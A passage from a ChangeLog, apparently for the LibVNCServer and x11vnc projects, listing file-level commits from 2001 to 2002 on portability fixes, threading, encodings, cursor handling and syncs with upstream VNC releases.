	rdr/FdOutStream.cxx, rdr/FdOutStream.h, rdr/FixedMemOutStream.h,
	rdr/InStream.cxx, rdr/InStream.h, rdr/MemInStream.h,
	rdr/MemOutStream.h, rdr/NullOutStream.cxx, rdr/NullOutStream.h,
	rdr/OutStream.h, rdr/ZlibInStream.cxx, rdr/ZlibInStream.h,
	rdr/ZlibOutStream.cxx, rdr/ZlibOutStream.h, rdr/types.h: rdr

2002-10-22  dscho <dscho>

	* Makefile, corre.c, cvs_update_anonymously, httpd.c, main.c,
	rfb.h, rfbproto.h, rfbserver.c, stats.c, zrle.cc, zrleDecode.h,
	zrleEncode.h: updated to vnc-3.3.4 (ZRLE encoding)

2002-08-31  dscho <dscho>

	* x11vnc.c: patch for IRIX

2002-08-31  dscho <dscho>

	* cvs_update_anonymously, httpd.c, rfbserver.c, vncauth.c: socket
	via proxy gets options set, compiler warning fixes

2002-08-31  dscho <dscho>

	* Makefile, cvs_update_anonymously, httpd.c, mac.c, pnmshow24.c,
	vncev.c, x11vnc.c, zippy.c: compiler warnings and format
	vulnerabilities fixed

2002-08-27  dscho <dscho>

	* Makefile, httpd.c: IRIX changes

2002-08-22  dscho <dscho>

	* CHANGES: changes

2002-08-22  dscho <dscho>

	* classes/javaviewer.pseudo_proxy.patch, example.c, httpd.c,
	main.c, rfb.h: a pseudo HTTP request for tunnelling (also via strict
	Web Proxy) was added.

2002-08-22  dscho <dscho>

	* classes/index.vnc, httpd.c, vncauth.c: synchronized with tightVNC
	1.2.5

2002-08-19  dscho <dscho>

	* Makefile, auth.c, cursor.c, example.c, httpd.c, main.c,
	pnmshow.c, rfb.h, rfbserver.c, sraRegion.c, sraRegion.h, tight.c,
	vncauth.c: unwarn compilation

2002-07-28  dscho <dscho>

	* CHANGES, README: prepare for version 0.4

2002-07-28  dscho <dscho>

	* CHANGES, classes/index.vnc, example.c, httpd.c, main.c, rfb.h,
	rfbproto.h, rfbserver.c, stats.c: NewFB encoding added

2002-06-13  dscho <dscho>

	* main.c, rfbserver.c, sockets.c: pthread fix

2002-05-03  dscho <dscho>

	* Makefile, rfb.h: solaris fixes (INADDR_NONE)

2002-05-02  dscho <dscho>

	* selbox.c: index was shadowed

2002-05-02  dscho <dscho>

	* cursor.c, font.c, httpd.c, main.c, rfb.h, rfbserver.c, sockets.c,
	sraRegion.c, stats.c, tableinit24.c, tight.c, translate.c: Tim's
	Changes

2002-04-30  dscho <dscho>

	* cargs.c, rfb.h: command line handling

2002-04-30  dscho <dscho>

	* Makefile, mac.c: more mac

2002-04-30  dscho <dscho>

	* mac.c: dimming for mac

2002-04-30  dscho <dscho>

	* mac.c: Mac compile fix

2002-04-25  dscho <dscho>

	* Makefile, x11vnc.c: x11vnc memleaks patched

2002-04-25  dscho <dscho>

	* CHANGES, cursor.c, example.c, main.c, rfbserver.c: memleaks
	patched

2002-04-25  dscho <dscho>

	* mac.c: now colour handling should be correct

2002-04-24  dscho <dscho>

	* main.c: bug for 3 bpp planes (as Mac OSX)

2002-04-23  dscho <dscho>

	* CHANGES, classes/index.vnc, httpd.c, rfbserver.c, sockets.c: sync
	with TightVNC 1.2.3

2002-04-23  dscho <dscho>

	* Makefile, mac.c: OSXvnc-server compile fixes

2002-04-23  dscho <dscho>

	* CHANGES, Makefile, rfb.h: another solaris clean compile

2002-04-23  dscho <dscho>

	* x11vnc.c: KBDDEBUG

2002-04-23  dscho <dscho>

	* main.c, rfb.h: solaris endian changes

2002-03-04  dscho <dscho>

	* Makefile, rfbserver.c, sockets.c: reverted exception fds to NULL,
	because of unexpected behaviour

2002-02-19  dscho <dscho>

	* CHANGES: changes

2002-02-18  dscho <dscho>

	* sockets.c: select exceptfds

2002-02-18  dscho <dscho>

	* README, cursor.c, example.c, httpd.c, main.c, rfb.h, rfbserver.c,
	sockets.c, tight.c, translate.c: changes from Tim Jansen: threading
	issues, new client can be rejected, and more

2002-01-17  dscho <dscho>

	* 1instance.c, Makefile: compile warning fix, dependency on
	1instance.c

2002-01-17  dscho <dscho>

	* mac.c: compile warning fix

2002-01-17  dscho <dscho>

	* font.c, rfb.h, rfbproto.h, rfbserver.c, vncauth.c: correct
	BackChannel handling, compile cleanups

2002-01-16  dscho <dscho>

	* mac.c: compile fix

2002-01-16  dscho <dscho>

	* 1instance.c, Makefile, cargs.c, mac.c, rfb.h, rfbproto.h,
	rfbserver.c, x11vnc.c: clean ups and encoding "backchannel"

2002-01-14  dscho <dscho>

	* mac.c: fixed compile on MAC

2002-01-14  dscho <dscho>

	* mac.c: toggle view only with OSX

2002-01-14  dscho <dscho>

	* 1instance.c, x11vnc.c: view mode now toggleable

2001-12-21  dscho <dscho>

	* mac.c, x11vnc.c: shared mode added

2001-12-14  dscho <dscho>

	* cargs.c, main.c: *argc=0 in cargs allowed, when copying area,
	first undraw cursor ...

2001-12-11  dscho <dscho>

	* mac.c: fixed osx compiling

2001-12-09  dscho <dscho>

	* Makefile, mac.c: Makefile cleanup, some special options for OSX

2001-12-09  dscho <dscho>

	* x11vnc.c: tile modus now near perfect (shm's better though)

2001-12-08  dscho <dscho>

	* x11vnc.c: start to probe single pixels for updates

2001-11-27  dscho <dscho>

	* TODO, x11vnc.c: fixed dumb XTestFakeInput bug

2001-11-27  dscho <dscho>

	* TODO, x11vnc.c: removed XTestGrabControl. Doesn't really solve the
	problem of a bad param.

2001-11-27  dscho <dscho>

	* TODO, x11vnc.c: few changes

2001-11-27  dscho <dscho>

	* Makefile, x11vnc.c: input works on other X11 servers than XFree86

2001-11-26  dscho <dscho>

	* TODO, x11vnc.c: no crash when display was wrong

2001-11-26  dscho <dscho>

	* TODO: todo

2001-11-25  dscho <dscho>

	* x11vnc.c: init keyboard now takes correct display

2001-11-23  dscho <dscho>

	* x11vnc.c: keyboard handling now works.

2001-11-22  dscho <dscho>

	* x11vnc.c: added cmd line parameters

2001-11-21  dscho <dscho>

	* CHANGES: changes

2001-11-20  dscho <dscho>

	* x11vnc.c: shm works again

2001-11-20  dscho <dscho>

	* Makefile, x11vnc.c: missing include for XTest

2001-11-19  dscho <dscho>

	* x11vnc.c: x11vnc now works with colour maps

2001-11-19  dscho <dscho>

	* x11vnc.c: tmp

2001-11-19  dscho <dscho>

	* x11vnc.c: first support for colourmaps

2001-11-19  dscho <dscho>

	* Makefile, x11vnc.c: works, but loads high

2001-11-19  dscho <dscho>

	* cargs.c, main.c, rfb.h: cmdline arg -passwd added

2001-11-19  dscho <dscho>

	* Makefile, x11vnc.c: x11vnc now works view only and with SHM

2001-11-18  dscho <dscho>

	* Makefile, example.c, main.c, rfb.h, rfbserver.c, x11vnc.c: start
	x11vnc, an x0rfbserver clone

2001-11-15  dscho <dscho>

	* example.dsp, libvncserver.dsp, libvncserver.dsw, main.c, rfb.h,
	rfbserver.c, sockets.c: Visual C++ / win32 compatibility
	reestablished

2001-11-14  dscho <dscho>

	* Makefile, TODO, font.c: docu, warning fixed

2001-11-14  dscho <dscho>

	* CHANGES: changes

2001-11-14  dscho <dscho>

	* cargs.c: separated argument handling from main.c

2001-11-14  dscho <dscho>

	* Makefile, d3des.h, example.c, fontsel.c, keysym.h, mac.c, main.c,
	pnmshow.c, pnmshow24.c, rfb.h, rfbproto.h, sraRegion.h, vncev.c,
	zippy.c: changes from Justin, zippy added

2001-11-08  dscho <dscho>

	* main.c: gettimeofday for windows

2001-10-25  dscho <dscho>

	* Makefile, main.c, rfbserver.c, sraRegion.c, sraRegion.h: clean ups

2001-10-19  dscho <dscho>

	* CHANGES: changes

2001-10-18  dscho <dscho>

	* Makefile, TODO, draw.c, main.c, rfb.h, vncev.c: add rfbDrawLine,
	rfbDrawPixel and vncev, an xev "lookalike"

2001-10-16  dscho <dscho>

	* main.c: scheduleCopyRegion no longer sends frameBufferUpdates (no
	longer clobbers deferring)

2001-10-16  dscho <dscho>

	* CHANGES, TODO, main.c, rfb.h, rfbserver.c: deferUpdate

2001-10-16  dscho <dscho>

	* TODO, font.c, rfbserver.c: font errors, requestedRegion bug

2001-10-15  dscho <dscho>

	* .gdb_history: unneccessary file

2001-10-13  dscho <dscho>

	* font.c: INT_MAX maybe not defined

2001-10-13  dscho <dscho>

	* TODO: todo

2001-10-13  dscho <dscho>

	* CHANGES, Makefile, README, TODO, auth.c, bdf2c.pl,
	consolefont2c.pl, cursor.c, default8x16.h, draw.c, font.c,
	fontsel.c, keysym.h, main.c, radon.h, rfb.h, selbox.c: rfbSelectBox,
	consoleFonts, too many changes

2001-10-12  dscho <dscho>

	* Makefile: changes to Makefile

2001-10-12  dscho <dscho>

	* README, rfb.h, rfbserver.c: cleanups

2001-10-11  dscho <dscho>

	* auth.c, corre.c, httpd.c, main.c, rfb.h, rfbserver.c, rre.c,
	sockets.c, sraRegion.c, tableinit24.c, tableinittctemplate.c,
	tight.c, zlib.c: replaced xalloc with malloc functions, udp input
	support (untested), fixed http

2001-10-10  dscho <dscho>

	* CHANGES, TODO, main.c, rfb.h, rfbserver.c: copyrect corrections,
	fd_set in rfbNewClient, dox in rfb.h for pthreads problem

2001-10-10  dscho <dscho>

	* Makefile, cursor.c, main.c, rfb.h, rfbserver.c, sockets.c: 
	pthreads corrections

2001-10-09  dscho <dscho>

	* sockets.c: start udp

2001-10-08  dscho <dscho>

	* Makefile, region.h, rfbserver.c: removes region.h

2001-10-07  dscho <dscho>

	* Makefile, README, tabletrans24template.c: fixed 24bit (update was
	garbled)

2001-10-07  dscho <dscho>

	* bdf2c.pl, font.c, main.c, rfb.h, rfbserver.c: font corrections,
	displayHook

2001-10-06  dscho <dscho>

	* README, d3des.c, example.c, example.dsp, httpd.c, kbdptr.c,
	libvncserver.dsp, libvncserver.dsw, main.c, rfb.h, rfbserver.c,
	sockets.c, tableinitcmtemplate.c, tight.c, translate.c, vncauth.c: 
	WIN32 compatibility, removed kbdptr.c

2001-10-05  dscho <dscho>

	* CHANGES, TODO, cursor.c, example.c, main.c, rfb.h, rfbserver.c: 
	changed cursor functions to use screen info, not cursor fixed copy
	rect.

2001-10-05  dscho <dscho>

	* Makefile, bdf2c.pl, example.c, font.c, radon.h, rfb.h: extracted
	font routines from example

2001-10-04  dscho <dscho>

	* CHANGES, Makefile, TODO, main.c, rfb.h, rfbserver.c: 
	rfbDoCopyRect/Region and rfbScheduleCopyRect/Region.

2001-10-04  dscho <dscho>

	* rfb.h: tried to compile on Sparcs. Original cc has problems. ar
	isn't there.

2001-10-04  dscho <dscho>

	* CHANGES, TODO, cursor.c, main.c, rfb.h, rfbserver.c: fixed 2
	pthreads issues, added noXCursor option.

2001-10-03  dscho <dscho>

	* TODO, main.c: working on IRIX pthreads problem

2001-10-03  dscho <dscho>

	* TODO, rfbserver.c: java viewer bug fixed

2001-10-03  dscho <dscho>

	* CHANGES, Makefile, TODO, main.c, rfb.h, rfbserver.c, sockets.c,
	stats.c, tight.c: upgraded to TridiaVNC 1.2.1

2001-10-02  dscho <dscho>

	* Makefile, TODO, cursor.c, d3des.c, main.c, rfb.h, rfbserver.c,
	sockets.c, translate.c, vncauth.c: no more compile warnings, pthread
	final(?) fixes

2001-10-02  dscho <dscho>

	* TODO: some todo items

2001-10-02  dscho <dscho>

	* CHANGES, cursor.c, rfb.h: implemented rfbSetCursor

2001-10-02  dscho <dscho>

	* rfb.h: prototype for rfbSendBell

2001-10-02  dscho <dscho>

	* CHANGES: changes

2001-10-02  dscho <dscho>

	* pnmshow24.c, tableinit24.c, tabletrans24template.c: forgot files
	for 3 bpp

2001-10-02  dscho <dscho>

	* Makefile, README, TODO, example.c, main.c, rfb.h, rfbserver.c,
	sockets.c, tableinitcmtemplate.c, translate.c: support for server
	side colour maps, fix for non-pthread, support for 3bpp

2001-10-01  dscho <dscho>

	* TODO: have to upgrade to newest VNC sources

2001-09-29  dscho <dscho>

	* Makefile, README, TODO, example.c, main.c, rfb.h, rfbserver.c,
	sockets.c: finally fixed pthreads

2001-09-29  dscho <dscho>

	* TODO, cursor.c: nother try

2001-09-29  dscho <dscho>

	* Makefile, cursor.c, main.c, rfb.h, rfbserver.c, sockets.c: more
	pthread debugging

2001-09-29  dscho <dscho>

	* Makefile, main.c, rfb.h: cleaned up pthreads (now compiles) and
	rfb.h (first undefine TRUE)

2001-09-29  dscho <dscho>

	* Makefile, README, TODO, include/X11/X.h, include/X11/Xalloca.h,
	include/X11/Xfuncproto.h, include/X11/Xfuncs.h, include/X11/Xmd.h,
	include/X11/Xos.h, include/X11/Xosdefs.h, include/X11/Xproto.h,
	include/X11/Xprotostr.h, include/X11/keysym.h,
	include/X11/keysymdef.h, include/Xserver/colormap.h,
	include/Xserver/cursor.h, include/Xserver/dix.h,
	include/Xserver/gc.h, include/Xserver/input.h,
	include/Xserver/misc.h, include/Xserver/miscstruct.h,
	include/Xserver/opaque.h, include/Xserver/os.h,
	include/Xserver/pixmap.h, include/Xserver/region.h,
	include/Xserver/regionstr.h, include/Xserver/screenint.h,
	include/Xserver/scrnintstr.h, include/Xserver/validate.h,
	include/Xserver/window.h, main.c, miregion.c, region.h, rfb.h,
	rfbserver.c, sraRegion.c, sraRegion.h, translate.c, xalloc.c: 
	dropped miregion and all the X stuff in favour of Wez' sraRegion,
	added dox

2001-09-28  dscho <dscho>

	* cursor.c, rfb.h: exported rfbReverseByte

2001-09-28  dscho <dscho>

	* cursor.c: don't send a cursor update if there is no cursor

2001-09-28  dscho <dscho>

	* README, TODO: small changes to README (contact) and TODO
	(autoconf?)

2001-09-28  dscho <dscho>

	* Makefile: libvncserver.a is not deleted by make clean

2001-09-28  dscho <dscho>

	* example.c: unnecessary include

2001-09-28  dscho <dscho>

	* Makefile, example.c, rfb.h: now compiles on FreeBSD

2001-09-28  dscho <dscho>

	* Makefile: make clean now cleans mac.o pnmshow.o and example.o

2001-09-27  dscho <dscho>

	* README, cursor.c, main.c, rfb.h, rfbserver.c: added
	setTranslateFunction as member of rfbScreenInfo, cursor may be NULL
	(no cursor).

2001-09-27  dscho <dscho>

	* Makefile, mac.c, rfb.h: try to make OSXvnc run again.

2001-09-27  dscho <dscho>

	* README, TODO, example.c, main.c, rfb.h: docu and cursors in
	examples.

2001-09-26  dscho <dscho>

	* Makefile, README, TODO, example.c, httpd.c, main.c, pnmshow.c,
	rfb.h: API corrections

2001-09-26  dscho <dscho>

	* TODO, main.c, pnmshow.c: adapted pnmshow to aligned width

2001-09-25  dscho <dscho>

	* example.c, tabletranstemplate.c: look for align bug with odd
	width. Bug in vncviewer?

2001-09-25  dscho <dscho>

	* libvncauth/d3des.c => d3des.c, libvncauth/d3des.h => d3des.h,
	libvncauth/Imakefile, libvncauth/Makefile, libvncauth/vncauth.h,
	libvncauth/vncauth.c => vncauth.c: permanently moved authorization

2001-09-25  dscho <dscho>

	* Makefile, rfb.h, storepasswd.c: moved vncauth to libvncserver

2001-09-25  dscho <dscho>

	* .depend: rmoved unneccessary files

2001-09-25  dscho <dscho>

	* Makefile, TODO, cursor.c, example.c, keysym.h, main.c, pnmshow.c,
	region.h, rfb.h, rfbserver.c: fix cursor bug; missing keysym; fix
	align problem on SGI; clean up cursor.c clean up rfb.h a bit; endian
	issues

2001-09-24  dscho <dscho>

	* region.h: forgot file

2001-09-24  dscho <dscho>

	* Makefile, TODO, cursor.c, example.c, include/Xserver/os.h,
	main.c, miregion.c, pnmshow.c, rfb.h, rfbserver.c, sockets.c,
	xalloc.c: bugfix: cursor (works now without xcursor encoding)

2001-09-24  dscho <dscho>

	* cursor.c, example.c, main.c, rfb.h, rfbserver.c: cursor changes

2001-09-23  dscho <dscho>

	* Makefile, README, TODO, cursor.c, example.c, httpd.c, main.c,
	rfb.h, rfbserver.c, sockets.c, zlib.c: cleaned up warnings, cursor
	changes

2001-09-21  dscho <dscho>

	* Makefile, classes/index.vnc, cursor.c, example.c, httpd.c,
	main.c, rfb.h: http added, prepare for cursor

2001-09-20  dscho <dscho>

	* README: changed README at last

2001-09-13  dscho <dscho>

	* Makefile, bdf2c.pl, example.c, radon.h: Now you can write
	something in addition to mouse movements ...

2001-08-14  dscho <dscho>

	* Makefile, example.c, main.c, pnmshow.c: comments & new example:
	pnmshow

2001-08-14  dscho <dscho>

	* example.c, main.c, rfb.h: now lines are drawn for the example,
	first steps to make clients independent.

2001-08-14  dscho <dscho>

	* Makefile, example.c, main.c, rfb.h, rfbserver.c: hooks inserted

2001-08-01  dscho <dscho>

	* Initial revision

